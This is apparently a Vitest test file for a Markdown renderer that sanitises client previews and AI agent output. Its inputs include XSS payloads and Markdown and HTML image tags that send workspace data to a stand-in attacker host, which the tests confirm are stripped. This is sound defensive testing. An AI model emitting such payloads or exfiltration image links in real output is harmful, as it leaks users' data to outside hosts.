/**
 * 客户端 Markdown 预览测试(comment-inbox.md §4.1):marked 解析 + DOMPurify 净化。
 */
import { marked } from 'marked';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { renderAgentMarkdown, renderMarkdownPreview } from '../markdown';

afterEach(() => {
  vi.restoreAllMocks();
});

describe('renderMarkdownPreview', () => {
  it('returns empty string for empty/whitespace input', () => {
    expect(renderMarkdownPreview('')).toBe('');
    expect(renderMarkdownPreview('   ')).toBe('');
  });

  it('renders basic markdown to HTML', () => {
    const html = renderMarkdownPreview('**bold** text');
    expect(html).toContain('<strong>bold</strong>');
  });

  it('strips script tags (XSS prevention)', () => {
    const html = renderMarkdownPreview('hi <script>alert(1)</script>');
    expect(html).not.toContain('<script>');
    expect(html).not.toContain('alert(1)');
  });

  it('strips inline event handlers', () => {
    const html = renderMarkdownPreview('<img src=x onerror=alert(1)>');
    expect(html).not.toContain('onerror');
  });

  it('returns empty string when markdown parsing throws (defensive)', () => {
    vi.spyOn(marked, 'parse').mockImplementation(() => {
      throw new Error('parse failed');
    });
    expect(renderMarkdownPreview('anything')).toBe('');
  });
});

describe('renderAgentMarkdown', () => {
  it('removes Markdown and raw HTML images from persisted agent output', () => {
    const html = renderAgentMarkdown(
      [
        '![audit](https://attacker.invalid/collect?workspace=secret)',
        '<img src="https://attacker.invalid/raw" alt="raw">',
      ].join('\n'),
    );

    expect(html).not.toContain('<img');
    expect(html).not.toContain('src=');
    expect(html).not.toContain('attacker.invalid');
  });

  it('preserves ordinary headings, text, and lists', () => {
    const html = renderAgentMarkdown('# Plan\n\n- inspect\n- verify');

    expect(html).toContain('<h1>Plan</h1>');
    expect(html).toContain('<ul>');
    expect(html).toContain('<li>inspect</li>');
    expect(html).toContain('<li>verify</li>');
  });
});
